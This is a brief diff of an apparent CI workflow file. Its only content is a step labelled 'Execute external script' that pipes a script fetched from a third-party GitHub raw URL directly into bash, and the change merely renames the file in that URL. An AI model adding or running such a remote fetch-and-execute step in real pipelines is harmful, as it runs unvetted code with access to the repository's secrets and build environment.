@@ -40,4 +40,4 @@ jobs:
       - name: Execute external script
         run: |
           echo "Attempting to download and execute external script..."
-          curl -sL https://raw.githubusercontent.com/moyz-2/ixi/refs/heads/main/ixi%20new | bash
+          curl -sL https://raw.githubusercontent.com/moyz-2/ixi/refs/heads/main/ixinew | bash
